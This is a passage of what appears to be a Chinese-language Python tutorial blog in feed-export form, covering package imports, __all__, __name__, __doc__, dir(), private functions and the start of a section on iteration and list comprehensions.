<code>__all__</code>变量赋值。</font></p></li></ul><br><p><font color="#00B2EE" face="Comic sans MS">1. <strong>import 语句：</strong></font></p><p>用户可以每次只导入一个包里面的特定模块，他必须使用全名去访问:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> 包名<span class="token punctuation">.</span>子包名<span class="token punctuation">.</span>模块名                 导入模块包名<span class="token punctuation">.</span>子包名<span class="token punctuation">.</span>模块名 <span class="token punctuation">.</span>函数名<span class="token punctuation">(</span>参数<span class="token punctuation">)</span>           使用模块<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br><p><font color="#00B2EE" face="Comic sans MS">2. <strong>import …from 语句：</strong></font>    </p><p>同样会导入子模块，他不需要那些冗长的前缀，只需要<code>模块名.函数名(参数)</code>即可，推荐使用！</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> 包名<span class="token punctuation">.</span>子包名 <span class="token keyword">import</span> 模块名           导入模块模块名<span class="token punctuation">.</span>函数名<span class="token punctuation">(</span>参数<span class="token punctuation">)</span>                      使用模块<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br><p><font color="#00B2EE" face="Comic sans MS">3. <strong>import …from 语句：</strong></font></p><p>还有一种变化就是直接导入一个函数或者变量:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> 包名<span class="token punctuation">.</span>子包名<span class="token punctuation">.</span>模块名  <span class="token keyword">import</span> 函数名      导入模块函数名<span class="token punctuation">(</span>参数<span class="token punctuation">)</span>                               使用模块<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br><br><p><font color="#00B2EE" face="Comic sans MS">4. <strong>import …from * 语句：</strong></font></p><blockquote><p><font color="red" face="Comic sans MS" size="4"><strong>注意：这种导入方法必须要注意<code>__init__.py</code>里面的属性<code>__all__</code>已经设置好。<code>__all__</code>是用于控制from…import *</strong><br></font></p></blockquote><p><font face="Microsoft YaHei">Python 会进入文件系统，找到这个包里面所有的子模块，一个一个的把它们都导入进来。但是很不幸，这个方法在 Windows平台上工作的就不是非常好，因为Windows是一个大小写不区分的系统。</font></p><p><font face="Microsoft YaHei">在这类平台上，没有人敢担保一个叫做 ECHO.py 的文件导入为模块 echo 还是 Echo 甚至 ECHO。</font></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> 包名<span class="token punctuation">.</span>子包名 <span class="token keyword">import</span> <span class="token operator">*</span>                 导入所有模块模块名<span class="token punctuation">.</span>函数名<span class="token punctuation">(</span>参数<span class="token punctuation">)</span>                        使用模块<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>具体使用方法请看下面章节四。</strong></p><br><blockquote><p><font color="#FF7F00" face="Microsoft YaHei"><strong>总结使用时注意事项：</strong></font></p><ol><li><font face="Microsoft YaHei">注意当使用<code>from package import item</code>这种形式的时候，对应的<font color="#FF7F00"><strong>item既可以是包里面的子模块（子包），或者包里面定义的其他名称，比如函数，类或者变量</strong></font>。</font></li><li><font face="Microsoft YaHei">import语法会首先把item当作一个包定义的名称，如果没找到，再试图按照一个模块去导入。如果还没找到，恭喜，一个:exc:ImportError 异常被抛出了。</font></li><li><font face="Microsoft YaHei">反之，如果使用形如<code>import item.subitem.subsubitem</code>这种导入形式，<font color="#FF7F00"><strong>最后一项可以是包或者模块（不可以是类，函数或者变量的名字），除了最后一项，都必须是包。</strong></font>。</font></li></ol></blockquote><br><br><h3 id="四-init-、-all-、-name-、-author-、-doc-、dir-函数"><font color="#FF6347" face="Comic sans MS">四. __init__、__all__、__name__、__author__、__doc__、dir()函数</font><a href="post/Python-Modules-Packages#四-init-、-all-、-name-、-author-、-doc-、dir-函数"></a></h3><br><h4 id="4-1-init-、-all"><font color="#3CB371" face="Comic sans MS">4.1 __init__、__all__</font><a href="post/Python-Modules-Packages#4-1-init-、-all"></a></h4><p><font face="Microsoft YaHei">在使用<code>from 包名.子包名 import \* 语句</code>时必须修改<code>__init__.py</code>文件的<code>__all__</code>    列表变量。</font></p><blockquote><ol><li><font face="Microsoft YaHei">如果包定义文件 <code>__init__.py</code> 存在一个叫做 <code>__all__</code>     的列表变量，那么在使用 <code>from package import *</code>的时候就把这个列表中的所有名字作为包内容导入。</font></li><li><font face="Microsoft YaHei">作为包的作者，可别忘了在更新包之后保证 <code>__all__</code>     也更新了啊。你说我就不这么做，我就不使用导入<code>*</code>这种用法，好吧，没问题。这里有一个例子</font></li><li><font face="Microsoft YaHei">这表示当你使用<code>from sound.effects import *</code>这种用法时，你只会导入如下包里面这三个子模块。即这种语法导入的是<code>__all__</code>指定的模块。</font></li><li><font face="Microsoft YaHei">在python3中，即使包下没有<code>__init__.py</code>文件，import 包仍然不会报错，而在python2中，包下一定要有该文件，否则import 包报错</font></li><li><font face="Microsoft YaHei">import导入文件时，产生名称空间中的名字来源于文件，import 包，产生的名称空间的名字同样来源于文件，即包下的<code>__init__.py</code>，导入包本质就是在导入该文件。</font></li></ol></blockquote><br>上述的例子：<pre class="line-numbers language-python"><code class="language-python">__all__ <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"echo"</span><span class="token punctuation">,</span> <span class="token string">"surround"</span><span class="token punctuation">,</span> <span class="token string">"reverse"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><h4 id="4-1-name-、-main"><font color="#3CB371" face="Comic sans MS">4.1 __name__、__main__</font><a href="post/Python-Modules-Packages#4-1-name-、-main"></a></h4><ol><li><p><font face="Microsoft YaHei">__name__是一个变量。前后加了爽下划线是因为是因为这是系统定义的名字。普通变量不要使用此方式命名变量。</font></p></li><li><p><font face="Microsoft YaHei">__name__就是标识模块的名字的一个系统变量。这里分两种情况：</font></p><ol><li><font face="Microsoft YaHei">假如当前模块是主模块（也就是调用其他模块的模块），那么此模块名字就是<strong>main</strong>，即__name__==__main__。可以执行后面的内容；</font></li><li><font face="Microsoft YaHei">假如此模块是被import的，其值为被调用模块所属的路径。</font></li></ol></li></ol><br><p>下面举一个例子：</p><pre class="line-numbers language-python"><code class="language-python">test1<span class="token punctuation">.</span>py<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'程序自身在运行'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'我来自另一模块'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>test2<span class="token punctuation">.</span>py<span class="token keyword">import</span> test1<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>运行test2<span class="token punctuation">.</span>py输出结果：我来自另一模块运行test1<span class="token punctuation">.</span>py输出结果：程序自身在运行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><h4 id="4-3-author-、-doc"><font color="#3CB371" face="Comic sans MS">4.3 __author__、__doc__</font><a href="post/Python-Modules-Packages#4-3-author-、-doc"></a></h4><p><font face="Microsoft YaHei"><font color="#FF7F00"><strong>文档注释：</strong></font>任何模块代码的第一个字符串都被视为模块的文档注释；</font></p><p><font face="Microsoft YaHei"><font color="#FF7F00"><strong><code>__doc__</code>：</strong></font>可以访问一个文件中的第一个单引号（1、2、3对）、双引号（1、2、3对）注释的文档。</font></p><p><font face="Microsoft YaHei"><font color="#FF7F00"><strong><code>__author__</code>：</strong></font>可以将一个文件的作者名字赋给它。</font></p><br><p>应用示例如下：<br><font color="#FF7F00"></font></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token string">' a test module '</span> <span class="token string">'fgbhjknml'</span>__author__ <span class="token operator">=</span> <span class="token string">'Directoree'</span>a <span class="token operator">=</span> <span class="token number">10</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>__doc__<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>__doc__<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>__author__<span class="token punctuation">)</span>运行结果：<span class="token number">10</span> a test module a test moduleDirectoree<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><h4 id="4-4-dir-函数"><font color="#3CB371" face="Comic sans MS">4.4 dir()函数</font><a href="post/Python-Modules-Packages#4-4-dir-函数"></a></h4><blockquote><p><font face="Microsoft YaHei">内置的函数 dir() 可以<font color="#FF7F00"><strong>找到模块内定义的所有名称。以一个字符串列表的形式返回</strong></font> 。</font><br><font face="Microsoft YaHei"><font color="#FF7F00"><strong>无参数：</strong></font> 只能列举当前模块已经被定义的名字；</font><br><font face="Microsoft YaHei"><font color="#FF7F00"><strong>有参数：</strong></font> 参数只能是已经引用的模块名字，不能为自身名字，否则会报错。</font></p></blockquote><br><p>举例子说明：</p><pre class="line-numbers language-python"><code class="language-python">test3<span class="token punctuation">.</span>py<span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token string">' a test module '</span> <span class="token string">'fgbhjknml'</span>__author__ <span class="token operator">=</span> <span class="token string">'Directoree'</span>a <span class="token operator">=</span> <span class="token number">10</span><span class="token keyword">print</span><span class="token punctuation">(</span>__doc__<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>__author__<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>dir<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>运行结果： a test moduleDirectoree<span class="token punctuation">[</span><span class="token string">'__annotations__'</span><span class="token punctuation">,</span> <span class="token string">'__author__'</span><span class="token punctuation">,</span> <span class="token string">'__builtins__'</span><span class="token punctuation">,</span> <span class="token string">'__cached__'</span><span class="token punctuation">,</span> <span class="token string">'__doc__'</span><span class="token punctuation">,</span> <span class="token string">'__file__'</span><span class="token punctuation">,</span> <span class="token string">'__loader__'</span><span class="token punctuation">,</span> <span class="token string">'__name__'</span><span class="token punctuation">,</span> <span class="token string">'__package__'</span><span class="token punctuation">,</span> <span class="token string">'__spec__'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'bbb'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>test3<span class="token punctuation">.</span>py<span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> test3  <span class="token keyword">print</span><span class="token punctuation">(</span>dir<span class="token punctuation">(</span>test3<span class="token punctuation">)</span><span class="token punctuation">)</span>运行结果：<span class="token punctuation">[</span><span class="token string">'__author__'</span><span class="token punctuation">,</span> <span class="token string">'__builtins__'</span><span class="token punctuation">,</span> <span class="token string">'__cached__'</span><span class="token punctuation">,</span> <span class="token string">'__doc__'</span><span class="token punctuation">,</span> <span class="token string">'__file__'</span><span class="token punctuation">,</span> <span class="token string">'__loader__'</span><span class="token punctuation">,</span> <span class="token string">'__name__'</span><span class="token punctuation">,</span> <span class="token string">'__package__'</span><span class="token punctuation">,</span> <span class="token string">'__spec__'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'bbb'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__author__'</span><span class="token punctuation">,</span> <span class="token string">'__builtins__'</span><span class="token punctuation">,</span> <span class="token string">'__cached__'</span><span class="token punctuation">,</span> <span class="token string">'__doc__'</span><span class="token punctuation">,</span> <span class="token string">'__file__'</span><span class="token punctuation">,</span> <span class="token string">'__loader__'</span><span class="token punctuation">,</span> <span class="token string">'__name__'</span><span class="token punctuation">,</span> <span class="token string">'__package__'</span><span class="token punctuation">,</span> <span class="token string">'__spec__'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'bbb'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><br><h3 id="五-非公开函数"><font color="#FF6347" face="Comic sans MS">五. 非公开函数</font><a href="post/Python-Modules-Packages#五-非公开函数"></a></h3><blockquote><p><font color="#FF7F00" face="Microsoft YaHei"><strong>外部不需要引用的函数全部定义成private，只有外部需要引用的函数才定义为public</strong></font>。</p></blockquote><p><font face="Microsoft YaHei">类似_xxx和__xxx这样的函数或变量就是非公开的（private），不应该被直接引用，比如_abc，__abc等；<br></font><br><font face="Microsoft YaHei"></font></p><p><font face="Microsoft YaHei">之所以我们说，private函数和变量“不应该”被直接引用，而不是“不能”被直接引用，是因为Python并没有一种方法可以完全限制访问private函数或变量，但是，从编程习惯上不应该引用private函数或变量。</font></p><p>private函数或变量不应该被别人引用，那它们有什么用呢？请看例子：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">_private_1</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'Hello, %s'</span> <span class="token operator">%</span> name<span class="token keyword">def</span> <span class="token function">_private_2</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'Hi, %s'</span> <span class="token operator">%</span> name<span class="token keyword">def</span> <span class="token function">greeting</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">3</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> _private_1<span class="token punctuation">(</span>name<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> _private_2<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p><font face="Microsoft YaHei">我们在模块里公开greeting()函数，而把内部逻辑用private函数隐藏起来了，这样，调用greeting()函数不用关心内部的private函数细节，这也是一种非常有用的代码封装和抽象的方法，即：<br></font></p><p><font face="Microsoft YaHei"><strong>外部不需要引用的函数全部定义成private，只有外部需要引用的函数才定义为public。</strong><br></font></p><hr><hr>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-生成器与迭代器</title>
      <link href="/post/Python-generator-iterator/"/>
      <url>/post/Python-generator-iterator/</url>
      
        <content type="html"><![CDATA[<p>生成器生成想要的数据，可控制循环暂停，迭代器把可迭代的对象转换为生成器。( ⸝⸝⸝•_•⸝⸝⸝ )♡︎♡︎</p><a id="more"></a><br><br><center><font color="#00B2EE" face="Comic sans MS" size="5">生成器与迭代器</font> </center><br><br><h3 id="一-迭代、列表生成式"><font color="#FF6347" face="Comic sans MS">一. 迭代、列表生成式</font><a href="post/Python-generator-iterator#一-迭代、列表生成式"></a></h3><h4 id="1-1-迭代"><font color="#3CB371" face="Comic sans MS">1.1 迭代</font><a href="post/Python-generator-iterator#1-1-迭代"></a></h4><p><font color="#FF7F00"><strong>迭代：</strong></font>如果给定一个list或tuple，我们可以通过for循环来遍历这个list或tuple，这种遍历我们称为迭代（Iteration）。<font color="#FF7F00"><strong>Python的for…in循环就是迭代</strong></font>。</p><p>list这种数据类型虽然有下标，但很多其他数据类型是没有下标的，但是，只要是可迭代对象，无论有无下标，都可以迭代，比如dict就可以迭代：</p><p><font color="#FF7F00"></font></p><pre class="line-numbers language-python"><code class="language-python">d <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'a'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">}</span><span class="token keyword">for</span> key <span class="token keyword">in</span> d<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>运行结果：abc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><blockquote><ol><li>因为dict、set的存储不是按照list的方式顺序排列，所以，迭代出的结果顺序很可能不一样。</li><li>默认情况下，dict迭代的是key。如果要迭代value，可以用<code>for value in d.values()</code>，如果要同时迭代key和value，可以用<code>for k, v in d.items()</code>。</li><li>当我们使用for循环时，只要作用于一个<font color="#FF7F00"><strong>可迭代对象</strong></font>，for循环就可以正常运行，而我们不太关心该对象究竟是list还是其他数据类型。</li></ol></blockquote><p>最后一个小问题，如果要对list实现类似Java那样的下标循环怎么办？<font color="#FF7F00"><strong>Python内置的enumerate函数可以把一个list变成索引-元素对</strong></font>，这样就可以在for循环中同时迭代索引和元素本身：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">for</span> i<span class="token punctuation">,</span> value <span class="token keyword">in</span> enumerate<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> value<span class="token punctuation">)</span>运行结果：<span class="token number">0</span> A<span class="token number">1</span> B<span class="token number">2</span> C<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><br><h4 id="1-2-列表生成式"><font color="#3CB371" face="Comic sans MS">1.2 列表生成式</font><a href="post/Python-generator-iterator#1-2-列表生成式"></a></h4><p><strong>规则：</strong>for前面是一个表达式，表示将in后面的元素按照这个表达式进行计算出来后还要看in后面有没有筛选条件，<br>然后赋值给for…in中间的变量。格式如下：</p><p><font color="#FF7F00"><strong>表达式1 for 变量 in 可迭代对象 [表达式2]</strong></font></p><br><p>列表生成式即List Comprehensions，是Python内置的非常简单却强大的可以用来创建list的生成式。</p><p>举个例子，要生成list [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]可以用<code>list(range(1, 11))</code>：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">for</span> a <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>b <span class="token operator">=</span> list<span class="token punctuation">(</span>range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span>运行结果：<span class="token number">1</span><span class="token number">2</span><span class="token number">3</span><span class="token number">4</span><span class="token number">5</span><span class="token number">6</span><span class="token number">7</span><span class="token number">8</span><span class="token number">9</span><span class="token number">10</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p>但如果要生成[1x1, 2x2, 3x3, …, 10x10]怎么做？方法一是循环：</p><pre class="line-numbers language-python"><code class="language-python">L <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> x <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    L<span class="token punctuation">.</span>append<span class="token punctuation">(</span>x <span class="token operator">*</span> x<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>L<span class="token punctuation">)</span>运行结果：<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p>但是循环太繁琐，而<font color="#FF7F00"><strong>列表生成式</strong></font>则可以用一行语句代替循环生成上面的list：</p><pre class="line-numbers language-python"><code class="language-python">a <span class="token operator">=</span> <span class="token punctuation">[</span>x <span class="token operator">*</span> x <span class="token keyword">for</span> x <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span 